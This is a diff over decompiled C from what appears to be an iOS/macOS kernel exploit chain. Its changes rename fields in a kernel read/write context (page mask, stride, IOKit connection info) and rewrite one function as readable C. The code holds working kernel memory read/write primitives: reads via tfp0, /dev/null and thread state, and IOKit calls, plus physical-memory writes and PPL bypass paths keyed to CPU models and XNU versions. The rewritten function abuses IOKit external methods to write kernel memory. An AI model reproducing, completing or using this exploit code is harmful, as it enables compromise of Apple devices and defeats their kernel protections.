@@ -308,7 +308,7 @@ int __fastcall kernel_version_parse(struct_xnuMajorVersion *xnuMajorVersion, int
 __int64 __fastcall sub_1F07C(vm_map_read_t a1, mach_vm_address_t a2, _QWORD *a3);
 __int64 number_of_cpus();
 unsigned __int64 comm_page_memory_size();
-__int64 sub_1F114();
+__int64 sub_get_page_size();
 __int64 __fastcall sub_1F148(task_name_t a1);
 __int64 sub_1F190();
 __int64 __fastcall sub_1F1C8(task_name_t a1, _QWORD *a2, _QWORD *a3);
@@ -473,7 +473,7 @@ __int64 __fastcall sub_2AB18(__int64 a1);
 __int64 __fastcall sub_2AD98(semaphore_t a1);
 __int64 __fastcall sub_2ADB4(__int64 a1);
 __int64 __fastcall sub_2B03C(__int64 a1);
-__int64 __fastcall sub_2B0E8(struct_krwCtx *krwCtx, unsigned __int64 vaddr, __int64 a3);
+kern_return_t sub_2B0E8(struct_krwCtx *krwCtx, uint64_t vaddr, uint64_t a3);
 __int64 __fastcall physwrite64_maybe(struct_krwCtx *krwCtx, unsigned __int64 paddr, __int64 value_1);
 __int64 __fastcall dmaFail_physwritebuf_ppl(__int64 a1, __int64 paddr, _QWORD *data, unsigned int size);
 __int64 __fastcall sub_2B5BC(__int64 a1, __int64 a2);
@@ -11415,7 +11415,7 @@ bool __fastcall sub_130B4(__int64 a1, unsigned __int64 a2, __int64 a3, unsigned 
 bool __fastcall sub_13304(struct_krwCtx *ctx, mach_vm_address_t vaddr, __int64 newBytes, __int64 size, int a5)
 {
   int v10; // w0
-  uint64_t qword188; // x8
+  uint64_t pageMask; // x8
   mach_vm_address_t v12; // x24
   __int64 v13; // x27
   uint64_t *v14; // x8
@@ -11434,9 +11434,9 @@ bool __fastcall sub_13304(struct_krwCtx *ctx, mach_vm_address_t vaddr, __int64 n
   if ( !v10 )
   {
     *(_QWORD *)&v25[4] = 0;
-    qword188 = ctx->qword188;
-    v12 = vaddr & ~qword188;
-    if ( v12 == ((vaddr + (unsigned int)size - 1) & ~qword188) )
+    pageMask = ctx->pageMask;
+    v12 = vaddr & ~pageMask;
+    if ( v12 == ((vaddr + (unsigned int)size - 1) & ~pageMask) )
     {
       if ( ctx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
         v13 = 16;
@@ -11900,7 +11900,7 @@ void __fastcall sub_13D9C(struct_krwCtx *a1, unsigned __int64 a2, __int64 a3)
   if ( krw_ctx_has_flag(a1, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) && kread64_outptr(a1, a2, &v7) && v7 != a3 )
   {
     v6 = kaddr_need_ppl_bypass((__int64)a1, a2);
-    ppl_kwritebuf_nocheck((__int64)a1, a2, (__int64)&v8, (unsigned int)a1->int168, v6, 1);
+    ppl_kwritebuf_nocheck((__int64)a1, a2, (__int64)&v8, (unsigned int)a1->stride168, v6, 1);
   }
 }
 
@@ -11910,7 +11910,7 @@ __int64 __fastcall kwrite_something(struct_krwCtx *a1, mach_vm_address_t a2, __i
   __int64 result; // x0
   __int64 v6; // [xsp+8h] [xbp-18h] BYREF
 
-  if ( !a5 || a1->int168 != (_DWORD)a4 )
+  if ( !a5 || a1->stride168 != (_DWORD)a4 )
   {
     result = kwritebuf_last_1((__int64)a1, a2, a3, a4);
     if ( !(_DWORD)result )
@@ -12790,13 +12790,13 @@ LABEL_15:
               && (v21 = port_name_to_kaddr(krwCtx, v18), (address = v21) != 0)
               && kread64_outptr(krwCtx, v21 + 16, (unsigned __int64 *)&address)
               && kread64_outptr(krwCtx, address + 24, (unsigned __int64 *)&address)
-              && noppl_kwrite32((__int64)krwCtx, address + krwCtx->int168, 255)
+              && noppl_kwrite32((__int64)krwCtx, address + krwCtx->stride168, 255)
               && (unsigned int)kreadbuf_last_1(krwCtx, address, 40, &v31)
               && (unsigned int)kwritebuf_last_1(
                                  (__int64)krwCtx,
-                                 krwCtx->gap191[4] + krwCtx->int168,
-                                 (__int64)&v31 + krwCtx->int168,
-                                 (unsigned int)(40 - krwCtx->int168)) != 0;
+                                 krwCtx->gap191[4] + krwCtx->stride168,
+                                 (__int64)&v31 + krwCtx->stride168,
+                                 (unsigned int)(40 - krwCtx->stride168)) != 0;
             mach_port_destroy(mach_task_self_, v19);
             if ( name[0] + 1 >= 2 )
               mach_port_destroy(mach_task_self_, name[0]);
@@ -15883,7 +15883,7 @@ __int64 __fastcall sub_19040(struct_krwCtx *a1, unsigned __int64 a2, __int64 a3)
   if ( !v6 )
     return 708617;
   v7 = v6;
-  sub_2183C((__int64)a1, v6 & ~a1->qword188, (__int64)size + 4);
+  sub_2183C((__int64)a1, v6 & ~a1->pageMask, (__int64)size + 4);
   v8 = v15 & 0xFFFFFFFFC000LL;
   if ( v9 )
     v10 = v8 == 0;
@@ -18757,11 +18757,11 @@ LABEL_13:
                     {
                       v13 = a1->gap190u & 0xFFFFFFFFFFLL
                           | ((unsigned __int64)(unsigned int)(a1->slideMaybe / (unsigned int)a1->pageSizeOrSomething) << 40);
-                      v12 = v14 + a1->int168 + 280;
+                      v12 = v14 + a1->stride168 + 280;
                     }
                     else
                     {
-                      v12 = v14 + a1->int168 + 280;
+                      v12 = v14 + a1->stride168 + 280;
                       v13 = a1->slideMaybe;
                     }
                     sub_288A4((__int64)a1, v12, v13);
@@ -20197,7 +20197,7 @@ unsigned __int64 comm_page_memory_size()
 }
 
 //----- (000000000001F114) ----------------------------------------------------
-__int64 sub_1F114()
+__int64 sub_get_page_size()
 {
   host_t v0; // w0
   vm_size_t v2; // [xsp+8h] [xbp-8h] BYREF
@@ -24197,7 +24197,7 @@ LABEL_61:
     if ( kread64_outptr(a1, v25, (unsigned __int64 *)&__size[1]) )
     {
       v24 = 0;
-      if ( (unsigned int)kreadbuf_last_1(a1, address + a1->int168, 4, __size) )
+      if ( (unsigned int)kreadbuf_last_1(a1, address + a1->stride168, 4, __size) )
       {
         v26 = __size[0];
         if ( __size[0] <= 0x80000u )
@@ -27883,18 +27883,18 @@ LABEL_6:
 //----- (00000000000281F0) ----------------------------------------------------
 __int64 __fastcall sub_281F0(struct_krwCtx *a1)
 {
-  uint64_t qword1D48; // x20
+  uint64_t IOKitConnInfo; // x20
   kern_return_t v4; // w0
   mach_port_name_t name; // [xsp+Ch] [xbp-14h] BYREF
 
-  qword1D48 = a1->qword1D48;
-  if ( !qword1D48 )
+  IOKitConnInfo = a1->IOKitConnInfo;
+  if ( !IOKitConnInfo )
     return 708609;
-  if ( (unsigned int)(*(_DWORD *)(qword1D48 + 112) + 1) < 2 )
+  if ( (unsigned int)(*(_DWORD *)(IOKitConnInfo + 112) + 1) < 2 )
     return 0;
   name = 0;
   if ( (unsigned int)sub_28288((__int64)a1, &name) )
-    return sub_1C8B0(a1, 0x14u, *(_DWORD *)(qword1D48 + 112));
+    return sub_1C8B0(a1, 0x14u, *(_DWORD *)(IOKitConnInfo + 112));
   v4 = mach_port_deallocate(mach_task_self_, name);
   if ( v4 )
     return v4 | 0x80000000;
@@ -27978,7 +27978,7 @@ __int64 __fastcall sub_28364(struct_krwCtx *a1)
   v32 = 0;
   v33 = 0;
   connect = 0;
-  v1 = a1->qword1D48;
+  v1 = a1->IOKitConnInfo;
   if ( !v1 )
   {
     v3 = 708642;
@@ -28139,7 +28139,7 @@ LABEL_26:
     if ( !(_DWORD)v3 )
     {
       v37 = v23;
-      if ( !noppl_kwritebuf((__int64)a1, v35 + 80, &v37, (unsigned int)a1->int168, 1) )
+      if ( !noppl_kwritebuf((__int64)a1, v35 + 80, &v37, (unsigned int)a1->stride168, 1) )
       {
 LABEL_73:
         v3 = 163856;
@@ -28151,7 +28151,7 @@ LABEL_73:
         if ( !validate_addr((__int64)a1, v36) )
           goto LABEL_19;
         v37 = 0;
-        if ( noppl_kwritebuf((__int64)a1, v36 + 8, &v37, (unsigned int)a1->int168, 1) )
+        if ( noppl_kwritebuf((__int64)a1, v36 + 8, &v37, (unsigned int)a1->stride168, 1) )
         {
           v27 = v30;
           goto LABEL_64;
@@ -28299,7 +28299,7 @@ LABEL_9:
       v4 = 163878;
       goto LABEL_20;
     }
-    if ( (((v13 + 1520) ^ v13) & ~a1->qword188) == 0 )
+    if ( (((v13 + 1520) ^ v13) & ~a1->pageMask) == 0 )
     {
       v4 = 0;
       v15 = *((_QWORD *)&v37 + v2);
@@ -28354,7 +28354,7 @@ LABEL_23:
 LABEL_29:
   if ( (_DWORD)v4 )
     return v4;
-  a1->qword1D48 = (uint64_t)v6;
+  a1->IOKitConnInfo = (uint64_t)v6;
   if ( !v6 )
     return 708609;
   v20 = sub_28CE0((__int64)a1, *v6, 1);
@@ -28368,7 +28368,7 @@ LABEL_29:
       v22 = v28;
       v6[2] = v28;
       v6[3] = v27;
-      v6[4] = (a1->qword188 & v21) + v22;
+      v6[4] = (a1->pageMask & v21) + v22;
       v3 = sub_39A24((__int64)a1, 0);
       if ( !(_DWORD)v3 )
       {
@@ -28523,7 +28523,7 @@ LABEL_3:
 __int64 __fastcall sub_28F90(struct_krwCtx *a1, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
 {
   __int64 v5; // x25
-  uint64_t qword1D48; // x8
+  uint64_t IOKitConnInfo; // x8
   unsigned int v8; // w26
   unsigned int v12; // w24
   __int64 v13; // x8
@@ -28585,8 +28585,8 @@ __int64 __fastcall sub_28F90(struct_krwCtx *a1, unsigned __int64 a2, __int64 a3,
   unsigned __int64 v70; // [xsp+68h] [xbp-58h] BYREF
 
   v5 = 708609;
-  qword1D48 = a1->qword1D48;
-  if ( !qword1D48 )
+  IOKitConnInfo = a1->IOKitConnInfo;
+  if ( !IOKitConnInfo )
   {
     TRACE_PORTS("sub_28F90 no state ctx=%llx addr=%llx size=%u\n",
                 (unsigned long long)a1,
@@ -28600,13 +28600,13 @@ __int64 __fastcall sub_28F90(struct_krwCtx *a1, unsigned __int64 a2, __int64 a3,
               (unsigned long long)a3,
               a4,
               a5,
-              (unsigned long long)qword1D48,
+              (unsigned long long)IOKitConnInfo,
               a1->flags,
-              *(unsigned __int8 *)(qword1D48 + 74),
+              *(unsigned __int8 *)(IOKitConnInfo + 74),
               a1->threadForKernelRead,
               (unsigned long long)*(_QWORD *)&a1->gap42[40]);
   v8 = a4;
-  if ( ((a2 & 3) != 0 || a4 != 4) && *(_BYTE *)(qword1D48 + 74) )
+  if ( ((a2 & 3) != 0 || a4 != 4) && *(_BYTE *)(IOKitConnInfo + 74) )
   {
     if ( a1->threadForKernelRead + 1 >= 2 )
     {
@@ -28699,7 +28699,7 @@ LABEL_25:
   else
   {
     v22 = v19;
-    if ( (((v21 + (unsigned int)v20 - 1) ^ (v21 + 3)) & ~a1->qword188) != 0 )
+    if ( (((v21 + (unsigned int)v20 - 1) ^ (v21 + 3)) & ~a1->pageMask) != 0 )
       v23 = 4 - v20;
     else
       v23 = 0;
@@ -28740,11 +28740,11 @@ LABEL_25:
     {
       v30 = 216;
     }
-    v31 = a1->qword1D48;
+    v31 = a1->IOKitConnInfo;
     v5 = 708609;
     if ( !v31 )
     {
-      TRACE_PORTS("sub_28F90 missing qword1D48 during chunk\n");
+      TRACE_PORTS("sub_28F90 missing IOKitConnInfo during chunk\n");
       goto LABEL_66;
     }
     v32 = *(_DWORD *)(v31 + 56);
@@ -28775,13 +28775,13 @@ LABEL_25:
       if ( a1->xnuVersionPacked > XNU_VERSION_PACKED(10002, 60, 75, 0, 2) && (a1->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
       {
         v68 = 0;
-        v39 = sub_38D60((__int64)a1, v60, &v68, a1->int168, 0);
+        v39 = sub_38D60((__int64)a1, v60, &v68, a1->stride168, 0);
         if ( (_DWORD)v39 )
           goto LABEL_64;
         if ( !validate_addr((__int64)a1, v68) )
           goto LABEL_55;
         v67 = 0;
-        v39 = sub_38D60((__int64)a1, v57, &v67, a1->int168, 0);
+        v39 = sub_38D60((__int64)a1, v57, &v67, a1->stride168, 0);
         if ( (_DWORD)v39 )
         {
 LABEL_64:
@@ -28835,7 +28835,7 @@ LABEL_64:
           v5 = v52;
           if ( !(_DWORD)v52 )
           {
-            v53 = physwritebuf_direct_mapped(a1, v60 + 24, &v70, a1->int168, 0);
+            v53 = physwritebuf_direct_mapped(a1, v60 + 24, &v70, a1->stride168, 0);
             v5 = v53;
             if ( !(_DWORD)v53 )
             {
@@ -28875,7 +28875,7 @@ LABEL_82:
           v5 = physmap_maybe((__int64)a1, &address, v56, paddr);
           if ( !(_DWORD)v5 )
           {
-            v42 = (a1->qword188 & v68) + address;
+            v42 = (a1->pageMask & v68) + address;
             v65 = *(_DWORD *)(v42 + 52);
             v5 = 163857;
             if ( v65 == 1 )
@@ -29032,7 +29032,7 @@ __int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
   unsigned __int64 v28; // x19
   __int64 v29; // x25
   kern_return_t v30; // w0
-  uint64_t qword188; // x25
+  uint64_t pageMask; // x25
   __int64 v32; // x19
   __int64 v33; // x25
   __int64 v34; // x0
@@ -29075,7 +29075,7 @@ __int64 __fastcall kreadbuf_via_dev_null_and_thread_state(
               sizeMinusI = size - iMaybe;
               iPtr = iMaybe;
               vaddrPlusI = vaddr_ + iMaybe;
-              if ( (krwCtx->qword188 & vaddrPlusI) == 0 && sizeMinusI >= 0x4000 && sub_25734((__int64)krwCtx) )
+              if ( (krwCtx->pageMask & vaddrPlusI) == 0 && sizeMinusI >= 0x4000 && sub_25734((__int64)krwCtx) )
               {
                 xnuVersionPacked = krwCtx->xnuVersionPacked;
                 if ( xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
@@ -29126,11 +29126,11 @@ LABEL_69:
               {
                 *(_QWORD *)old_stateCnt = 0;
                 v47 = 132;
-                qword188 = krwCtx->qword188;
-                if ( (qword188 & v22) >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
+                pageMask = krwCtx->pageMask;
+                if ( (pageMask & v22) >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
                   v32 = (unsigned int)krwCtx->pageSizeOrSomething - 528LL;
                 else
-                  v32 = qword188 & v22;
+                  v32 = pageMask & v22;
                 if ( validate_addr((__int64)krwCtx, *(_QWORD *)&krwCtx->gap42[48]) )
                 {
                   *(_QWORD *)old_stateCnt = *(_QWORD *)&krwCtx->gap42[48];
@@ -29142,7 +29142,7 @@ LABEL_69:
                 {
                   *(_QWORD *)&krwCtx->gap42[48] = *(_QWORD *)old_stateCnt;
 LABEL_45:
-                  v33 = v32 + (v22 & ~qword188);
+                  v33 = v32 + (v22 & ~pageMask);
                   __dsb(0xBu);
                   v49 = v33 - 16;
                   v34 = physwritebuf_direct_mapped(krwCtx, *(_QWORD *)&krwCtx->gap42[40], &v49, 8u, 0);
@@ -29182,7 +29182,7 @@ LABEL_45:
               else
               {
                 old_stateCnt[0] = 132;
-                v25 = krwCtx->qword188;
+                v25 = krwCtx->pageMask;
                 v26 = v22 & ~v25;
                 v27 = v25 & v22;
                 if ( v27 >= (unsigned __int64)(unsigned int)krwCtx->pageSizeOrSomething - 528 )
@@ -29295,16 +29295,16 @@ bool __fastcall kread64_internal(struct_krwCtx *a1, unsigned __int64 a2, _QWORD 
   v3 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, _QWORD *, _QWORD, __int64))&a1->gap4[44];
   if ( v3 )
   {
-    v4 = v3(a1, a2, a3, (unsigned int)a1->int168, 1);
+    v4 = v3(a1, a2, a3, (unsigned int)a1->stride168, 1);
     goto LABEL_3;
   }
   if ( a1->threadForKernelRead + 1 >= 2 && *(_QWORD *)&a1->gap42[40] )
   {
-    v4 = kreadbuf_via_dev_null_and_thread_state(a1, a2, (__int64)a3, a1->int168, 1);
+    v4 = kreadbuf_via_dev_null_and_thread_state(a1, a2, (__int64)a3, a1->stride168, 1);
   }
   else if ( (unsigned int)(*(_DWORD *)&a1->gap42[56] + 1) >= 2 && *(_QWORD *)&a1->gap42[72] && *(_QWORD *)&a1->gap42[80] )
   {
-    v4 = kreadbuf_via_IOConnectCallMethod((__int64)a1, a2, (__int64)a3, a1->int168, 1);
+    v4 = kreadbuf_via_IOConnectCallMethod((__int64)a1, a2, (__int64)a3, a1->stride168, 1);
   }
   else
   {
@@ -29312,16 +29312,16 @@ bool __fastcall kread64_internal(struct_krwCtx *a1, unsigned __int64 a2, _QWORD 
       goto LABEL_22;
     if ( a1->gap1915 != -1 && a1->gap190u )
     {
-      v4 = kreadbuf_via_dev_null_only((__int64)a1, a2, (__int64)a3, a1->int168, 1);
+      v4 = kreadbuf_via_dev_null_only((__int64)a1, a2, (__int64)a3, a1->stride168, 1);
       goto LABEL_3;
     }
     if ( a1->gap1913 == -1 || a1->gap1914 == -1 )
     {
 LABEL_22:
-      v5 = kreadbuf_via_tfp0(a1->gap191[693], a2, a1->int168, (unsigned int)a1->gap16C[3], (__int64)a3, &v7);
+      v5 = kreadbuf_via_tfp0(a1->gap191[693], a2, a1->stride168, (unsigned int)a1->gap16C[3], (__int64)a3, &v7);
       return v5 == 0;
     }
-    v4 = kreadbuf_via_dev_null_simple(a1, a2, a3, a1->int168, 1);
+    v4 = kreadbuf_via_dev_null_simple(a1, a2, a3, a1->stride168, 1);
   }
 LABEL_3:
   if ( v4 )
@@ -29528,7 +29528,7 @@ __int64 __fastcall sub_2A0D8(struct_krwCtx *a1, __int64 a2, __int64 a3)
 
   v14 = 0;
   memset(v13, 0, sizeof(v13));
-  sub_2183C((__int64)a1, a2 & ~a1->qword188, (__int64)v11);
+  sub_2183C((__int64)a1, a2 & ~a1->pageMask, (__int64)v11);
   if ( !v6 )
     return 0;
   v7 = physmap_map_cached(a1, v12 & 0xFFFFFFFFC000LL, (__int64)v13);
@@ -29540,7 +29540,7 @@ __int64 __fastcall sub_2A0D8(struct_krwCtx *a1, __int64 a2, __int64 a3)
       return v9;
     goto LABEL_7;
   }
-  *(_QWORD *)((a1->qword188 & a2) + *(_QWORD *)&v13[0]) = a3;
+  *(_QWORD *)((a1->pageMask & a2) + *(_QWORD *)&v13[0]) = a3;
   v9 = 1;
   if ( v8 )
 LABEL_7:
@@ -30356,137 +30356,135 @@ LABEL_10:
 }
 
 //----- (000000000002B0E8) ----------------------------------------------------
-__int64 __fastcall sub_2B0E8(struct_krwCtx *krwCtx, unsigned __int64 vaddr, __int64 a3)
+kern_return_t sub_2B0E8(struct_krwCtx *krwCtx, uint64_t vaddr, uint64_t a3)
 {
-  struct_qword1D48 *qword1D48; // x8
-  mach_port_t v4; // w21
-  __int64 v5; // x20
-  unsigned __int64 paddr; // x22
-  __int64 v7; // x27
-  __int64 v8; // x8
-  __int64 v9; // x25
-  vm_size_t pageSize; // x9
-  __int64 v14; // x10
-  __int64 v15; // x12
-  __int64 v16; // x13
-  __int64 v17; // x14
-  kern_return_t v18; // w0
-  uint64_t v19; // x28
-  unsigned __int64 paddr_2; // x0
-  unsigned __int64 paddr_1; // x27
-  __int64 v23; // x0
-  __int64 v24; // x0
-  __int64 v25; // x0
-  __int64 v26; // x0
-  unsigned __int64 v27; // [xsp+0h] [xbp-2A0h]
-  __int64 v28; // [xsp+8h] [xbp-298h] BYREF
-  uint64_t input; // [xsp+10h] [xbp-290h] BYREF
-  size_t outputStructCnt; // [xsp+18h] [xbp-288h] BYREF
-  unsigned __int64 v31; // [xsp+20h] [xbp-280h] BYREF
-  int v32; // [xsp+2Ch] [xbp-274h] BYREF
-  __int128 outputStruct[16]; // [xsp+30h] [xbp-270h] BYREF
-  int inputStruct; // [xsp+138h] [xbp-168h] BYREF
-  int v35[56]; // [xsp+13Ch] [xbp-164h] BYREF
-  _BYTE v36[28]; // [xsp+21Ch] [xbp-84h] BYREF
+    // [x0+0x1d48] = pointer to IOKit connection info struct
+    struct_IOKitConnInfo *connInfo = krwCtx->IOKitConnInfo; // [krwCtx+0x1d48]
+    if (!connInfo)
+        return 0xAD001;  // 708609: no connection
 
-  v31 = 0;
-  qword1D48 = (struct_qword1D48 *)krwCtx->qword1D48;
-  if ( !qword1D48 )
-    return 708609;
-  v4 = qword1D48->dword70;
-  if ( v4 + 1 < 2 )
-    return 163848;
-  v5 = qword1D48->qword58;
-  if ( !v5 )
-    return 163878;
-  paddr = qword1D48->qword60;
-  if ( !paddr )
-    return 163878;
-  v7 = qword1D48->qword68;
-  if ( !v7 )
-    return 163878;
-  v8 = qword1D48->qword50;
-  v9 = 163857;
-  if ( !v8 )
-    return v9;
-  pageSize = vm_page_size;
-  memset(v36, 0, sizeof(v36));
-  memset(v35, 0, sizeof(v35));
-  inputStruct = 128;
-  v14 = 10;
-  v15 = 12;
-  if ( krwCtx->xnuMajorVersion > 8795 )
-    v14 = 12;
-  v16 = 14;
-  if ( krwCtx->xnuMajorVersion > 8795 )
-    v15 = 14;
-  v17 = 16;
-  if ( krwCtx->xnuMajorVersion > 8795 )
-  {
-    v16 = 16;
-    v17 = 18;
-  }
-  *(_QWORD *)&v35[v14 - 1] = vm_page_size;
-  *(_QWORD *)&v35[v15 - 1] = v8;
-  *(_QWORD *)&v35[v16 - 1] = v8;
-  *(_QWORD *)&v35[v17 - 1] = pageSize;
-  memset(outputStruct, 0, sizeof(outputStruct));
-  outputStructCnt = 0x100;
-  v18 = IOConnectCallStructMethod(v4, 9u, &inputStruct, 0x100u, outputStruct, &outputStructCnt);
-  if ( v18 )
-    return v18 | 0x80000000;
-  v19 = HIDWORD(outputStruct[1]);
-  if ( (unsigned int)(HIDWORD(outputStruct[1]) - 1) > 0x3FE )
-    return v9;
-  if ( !kreadbuf(krwCtx, v7 + (unsigned int)(krwCtx->int168 * HIDWORD(outputStruct[1])), krwCtx->int168, &v31, 0) )
-    return 163855;
-  v31 = sub_29CB0(krwCtx, v31);
-  if ( !validate_addr((__int64)krwCtx, v31) )
-    return 163878;
-  paddr_2 = sub_218A8((__int64)krwCtx, v31 + 16, 0);
-  if ( !paddr_2 )
-    return 163878;
-  paddr_1 = paddr_2;
-  if ( (((v31 + 16) ^ (v31 + 120)) & ~krwCtx->qword188) != 0 )
-  {
-    v9 = 163878;
-    v27 = sub_218A8((__int64)krwCtx, v31 + 120, 0);
-    if ( !v27 )
-      return v9;
-  }
-  else
-  {
-    v27 = paddr_2 + 104;
-  }
-  v32 = 0;
-  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
-    v23 = physwritebuf_direct_mapped(krwCtx, paddr_1, &v32, 4u, 0);
-  else
-    v23 = dmaFail_physwritebuf_ppl((__int64)krwCtx, paddr_1, &v32, 4u);
-  v9 = v23;
-  if ( !(_DWORD)v23 )
-  {
-    if ( kreadbuf(krwCtx, vaddr, 8u, &v28, 0) )
-    {
-      v24 = physwrite64_maybe(krwCtx, v27, v28 - a3);
-      v9 = v24;
-      if ( !(_DWORD)v24 )
-      {
-        v25 = physwrite64_maybe(krwCtx, paddr, vaddr);
-        v9 = v25;
-        if ( !(_DWORD)v25 )
-        {
-          input = v19;
-          IOConnectCallScalarMethod(v4, 0xAu, &input, 1u, 0, 0);
-          v26 = physwrite64_maybe(krwCtx, paddr, v5);
-          return v26;
-        }
-      }
-      return v9;
+    // w26 = 0x20026 = base error code
+    // w21 = connection port (dword at +0x70)
+    mach_port_t ioPort = connInfo->ioPort;     // [connInfo+0x70]
+    if ((uint32_t)(ioPort + 1) < 2)
+        return 0x20026 - 0x1e;  // 0x20008 = 131080: invalid port
+
+    uint64_t qword58 = connInfo->qword58;      // slot table base or similar
+    if (!qword58)  return 0x20026;             // 131110
+    uint64_t qword60 = connInfo->qword60;      // paddr target 1
+    if (!qword60)  return 0x20026;
+    uint64_t qword68 = connInfo->qword68;      // x27: some pointer/table
+    if (!qword68)  return 0x20026;
+    uint64_t qword50 = connInfo->qword50;      // x8: used in inputStruct
+    if (!qword50)  return 0x20026 - 0x15;      // 0x20011 = 131089
+
+    // --- Build inputStruct at [sp+0x138], size 0x100 ---
+    // Zero entire 0x100-byte region first (the stur q0 block)
+    uint8_t inputStruct[0x100];
+    memset(inputStruct, 0, sizeof(inputStruct));
+    *(uint32_t *)&inputStruct[0] = 0x80;  // str w10,[sp+0x138] = 128
+
+    // Version-dependent field offsets within inputStruct
+    // csel chain: if xnuMajorVersion > 0x225B: offsets +8 each
+    uint64_t vm_pgsz = vm_page_size;           // x9 = vm_page_size global
+    int off0, off1, off2, off3;
+    if (krwCtx->xnuMajorVersion > 0x225B) {
+        off0 = 0x30; off1 = 0x38; off2 = 0x40; off3 = 0x48;
+    } else {
+        off0 = 0x28; off1 = 0x30; off2 = 0x38; off3 = 0x40;
     }
-    return 163855;
-  }
-  return v9;
+    *(uint64_t *)&inputStruct[off0] = vm_pgsz;  // str x9,[x15,x10]
+    *(uint64_t *)&inputStruct[off1] = qword50;  // str x8,[x15,x12]
+    *(uint64_t *)&inputStruct[off2] = qword50;  // str x8,[x15,x13]
+    *(uint64_t *)&inputStruct[off3] = vm_pgsz;  // str x9,[x15,x14]
+
+    // outputStruct at [sp+0x30], size 0x100
+    uint8_t outputStruct[0x100];
+    memset(outputStruct, 0, sizeof(outputStruct));
+    size_t outputStructCnt = 0x100;
+
+    kern_return_t kr = IOConnectCallStructMethod(
+        ioPort, 9,
+        inputStruct, 0x100,
+        outputStruct, &outputStructCnt);
+    if (kr)
+        return kr | 0x80000000;
+
+    // Result field at outputStruct[0x1c] (sp+0x4c = sp+0x30+0x1c)
+    uint32_t result_idx = *(uint32_t *)&outputStruct[0x1c];  // w28
+
+    // Validate: result_idx must be in [1, 0x3ff]
+    if ((uint32_t)(result_idx - 1) > 0x3FE)
+        return 0x20026 - 0x15;  // 131089
+
+    // kreadbuf: read one element from qword68 table at result_idx
+    // stride = krwCtx->stride168 (ldrsw = signed word)
+    int32_t  stride  = krwCtx->stride168;  // [krwCtx+0x168]
+    uint64_t tbl_ptr = qword68 + (uint32_t)(stride * result_idx);
+    uint64_t kaddr   = 0;
+
+    if (!kreadbuf(krwCtx, tbl_ptr, stride, &kaddr, 0))
+        return 0x20026 - 0x17;  // 0x2000F = 131087
+
+    // w26 updated: w26 = 0x20026 - 0x17 = 0x2000F (used as error below)
+
+    // Translate/canonicalize kaddr
+    kaddr = sub_29CB0(krwCtx, kaddr);
+
+    if (!validate_addr(krwCtx, kaddr))
+        return 0x20026;  // 131110
+
+    // Get physical address of kaddr+0x10
+    uint64_t paddr1 = sub_218A8(krwCtx, kaddr + 0x10, 0);
+    if (!paddr1)
+        return 0x20026;
+
+    // Check if kaddr+0x10 and kaddr+0x78 are in same physical page
+    // bics xzr, ((kaddr+0x10)^(kaddr+0x78)), ~krwCtx->page_mask
+    // b.eq → same page (no second sub_218A8 needed)
+    uint64_t paddr2;
+    if (((kaddr + 0x10) ^ (kaddr + 0x78)) & ~krwCtx->pageMask) {
+        // Different pages — get separate paddr for kaddr+0x78
+        paddr2 = sub_218A8(krwCtx, kaddr + 0x78, 0);  // x1 used at +548
+        if (!paddr2)
+            return 0x20026;
+        // paddr2 stored at [sp+0x0]
+    } else {
+        // Same page — kaddr+0x78 = paddr1 + 0x68
+        paddr2 = paddr1 + 0x68;
+        // stored at [sp+0x0]
+    }
+
+    // Write 0 to paddr1 (4 bytes) using appropriate physical write method
+    uint32_t zero_val = 0;
+    uint64_t version_threshold = 0x0027120F04B00003ULL;
+    if (krwCtx->xnuVersionPacked >= version_threshold
+        && (*(uint8_t *)krwCtx & 0x20)) {  // tbnz w8, #5 → bit 5 of krwCtx[0]
+        kr = physwritebuf_direct_mapped(krwCtx, paddr1, &zero_val, 4, 0);
+    } else {
+        kr = dmaFail_physwritebuf_ppl(krwCtx, paddr1, &zero_val, 4);
+    }
+    if (kr) return kr;
+
+    // Read 8 bytes from vaddr
+    uint64_t vaddr_val = 0;
+    if (!kreadbuf(krwCtx, vaddr, 8, &vaddr_val, 0))
+        return 0x2000F;  // 131087
+
+    // Write (vaddr_val - a3) to paddr2
+    kr = physwrite64_maybe(krwCtx, paddr2, vaddr_val - a3);
+    if (kr) return kr;
+
+    // Write vaddr to qword60
+    kr = physwrite64_maybe(krwCtx, qword60, vaddr);
+    if (kr) return kr;
+
+    // IOConnectCallScalarMethod(ioPort, 10, &result_idx, 1, NULL, NULL)
+    uint64_t scalar_in = result_idx;
+    IOConnectCallScalarMethod(ioPort, 10, &scalar_in, 1, NULL, NULL);
+
+    // Final: restore qword60 → qword58
+    return physwrite64_maybe(krwCtx, qword60, qword58);
 }
 // 2B3CC: variable 'v23' is possibly undefined
 // 2B400: variable 'v24' is possibly undefined
@@ -36500,7 +36498,7 @@ unsigned __int64 __fastcall sub_328A4(struct_krwCtx *a1, unsigned __int64 ipc_po
   }
   if ( xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || (v6 & 0x400) == 0 )
     return v7;
-  if ( kread64_outptr(a1, v7 + a1->int168, (unsigned __int64 *)&v7) )
+  if ( kread64_outptr(a1, v7 + a1->stride168, (unsigned __int64 *)&v7) )
   {
     result = validate_addr((__int64)a1, v7);
     if ( !result )
@@ -37117,7 +37115,7 @@ __int64 __fastcall sub_3341C(struct_krwCtx *a1, __int64 a2, int pid, const char 
   if ( !v16 )
     return 0;
   v17 = v16;
-  v18 = a1->int168;
+  v18 = a1->stride168;
   v19 = a1->gap1921[2];
   if ( v19 )
   {
@@ -38955,7 +38953,7 @@ LABEL_16:
     {
       v15 = v16;
     }
-    if ( kread64_outptr(a1, v13 + a1->int168 * (__int64)a2, (unsigned __int64 *)&v14) )
+    if ( kread64_outptr(a1, v13 + a1->stride168 * (__int64)a2, (unsigned __int64 *)&v14) )
     {
       if ( validate_addr((__int64)a1, v14) )
